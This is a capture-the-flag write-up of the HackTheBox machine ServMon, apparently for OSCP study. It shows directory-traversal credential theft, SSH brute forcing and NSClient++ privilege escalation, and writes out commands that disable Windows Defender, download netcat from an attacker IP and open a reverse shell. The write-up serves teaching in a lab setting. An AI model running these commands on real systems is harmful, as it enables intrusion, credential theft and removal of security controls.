---
layout: post
title: "ServMon - HTB"
date: 2025-02-18 06:25:00 -0400
categories:
    - posts
tags:
    - Road2OSCP
    - CTF
    - en
    - writeup
---



# [HTB] ServMon Write-up

## Introduction

ServMon (HackTheBox) is an **Easy Windows** machine that presented multiple challenges in enumeration, exploitation, and privilege escalation. Key takeaways include:
- **Exploiting LFI with BurpSuite & curl** (`--path-as-is` trick).  
- **Understanding NVMS configuration**, which restricted access to localhost, requiring SSH tunneling.  
- **Bypassing Windows Defender** to execute a reverse shell via NSClient++.  

## Penetration Testing Methodology

### **1. Reconnaissance**

Starting with an `nmap` scan:

```bash
nmap -sC -sV -p- 10.129.29.110
```

Open ports discovered:
- **FTP (21/tcp)** with **anonymous login** enabled.
- **SSH (22/tcp)** available.
- **HTTP (80/tcp)** hosting NVMS-1000.
- **NSClient++ (8443/tcp)** running but restricted to localhost.

### **2. Enumeration**

#### **Connecting to FTP as Anonymous**
```bash
ftp 10.129.29.110
```

Inside `/Users/`, found folders **Nadine** and **Nathan**. Downloaded files:
```bash
get Confidential.txt
get Notes to do.txt
```

- `Confidential.txt` mentioned **Passwords.txt** on Nathan’s Desktop.
- `Notes to do.txt` referenced **NVMS-1000**, **NSClient++**, and **SharePoint**.

#### **Browsing HTTP Service**
Navigated to `http://10.129.29.110` and identified **NVMS-1000**, confirming its presence.

### **3. Exploitation**

#### **Exploiting Directory Traversal (LFI)**
Found **public exploit for NVMS-1000 (CVE-2020-9470)** using searchsploit:
```bash
searchsploit nvms
searchsploit -m 47774
```

Used **LFI upscale** via `curl` to read Nathan’s `Passwords.txt`:
```bash
curl -vv -X GET "http://10.129.29.110/../../../../../../../../../../../../users/Nathan/Desktop/Passwords.txt" \
--path-as-is
```

#### **Brute Force SSH using Hydra**
```bash
hydra -L users.txt -P passwords.txt 10.129.29.110 ssh
```

Found valid SSH credentials:
```bash
nadine:L1k3B1gBut7s@W0rk
```

Logged in:
```bash
ssh nadine@10.129.29.110
```

Read user flag:
```bash
type C:\Users\Nadine\Desktop\user.txt
```

### **4. Privilege Escalation**

#### **Abusing NSClient++**
Found **NSClient++** installed in `C:\Program Files\NSClient++`.

Examined `nsclient.ini`:
```bash
type C:\Program Files\NSClient++\nsclient.ini
```
Identified a **password** and confirmed that **NSClient++ only allowed connections from localhost**.

#### **Bypassing Localhost Restriction with SSH Port Forwarding**
```bash
ssh -L 8443:127.0.0.1:8443 nadine@10.129.29.110
```

#### **Disabling Windows Defender for Payload Execution**
**Problem:** Windows Defender removed `nc.exe`.  
**Solution:** Used NSClient++ to execute a script that disabled Defender:
```powershell
powershell Set-MpPreference -DisableRealtimeMonitoring $true
```

Created a **batch script (`disable_av.bat`)**, uploaded it, and executed via NSClient++.

#### **Uploading and Executing Netcat for SYSTEM Shell**
```bash
iwr http://10.10.14.52:8000/nc64.exe -Outfile C:\Temp\nc.exe
```

Created `exploit.bat`:
```bash
@echo off
C:\Temp\nc.exe <YOUR_IP> 443 -e cmd
```

Executed the script through NSClient++ External Scripts.

Started a **reverse shell listener**:
```bash
nc -lvnp 443
```

Shell received:
```bash
whoami
nt authority\system
```

Read **root flag**:
```bash
type C:\Users\Administrator\Desktop\root.txt
```

### **5. Conclusion**

This machine presented key **pentesting challenges**:
- **Advanced LFI exploitation** (BurpSuite & curl `--path-as-is` trick).
- **SSH tunneling to access internal services**.
- **Abusing NSClient++ for SYSTEM privileges**.
- **Bypassing Windows Defender to execute netcat**.


## **6. Conclusion v2**  

### **Key Challenges & Solutions**  
The **most challenging aspect** of this machine was bypassing **Windows Defender**, as netcat kept disappearing. The breakthrough came when I leveraged **NSClient++ to execute commands as SYSTEM**, allowing me to disable Defender and run my payload. Additionally, **LFI was tricky** since it couldn’t be executed directly, requiring the correct use of **BurpSuite headers and curl’s `--path-as-is` option** to retrieve the credentials.  

### **Lessons Learned**  
- Improved **curl techniques** for LFI exploitation.  
- Learned how to **disable Windows Defender remotely** through a SYSTEM service.  

### **Security Mitigation Recommendations**  
- **Patch and update** vulnerable software (e.g., NVMS-1000).  
- Restrict unnecessary applications from **running as SYSTEM**.  
- **Disable SSH password authentication** and enforce certificate-based auth.  

### **What Would I Do Differently?**  
- Optimize **enumeration** to detect the SSH access earlier.  
- Spend less time trying to execute LFI manually and focus on **header-based** techniques.  

### **OSCP & Real-World Pentesting Relevance**  
This machine is a **solid introduction to Windows penetration testing**. It covers:  
✅ **Enumeration & Exploitation** (LFI, credential discovery, SMB bruteforcing).  
✅ **Privilege Escalation** using a **SYSTEM service** (NSClient++).  
✅ **AV Evasion & Bypassing Security Measures**, a crucial skill for **OSCP**.  

Overall, **ServMon is a great starting point** for Windows pentesting, reinforcing **fundamental enumeration, exploitation, and privesc techniques**. 🚀  
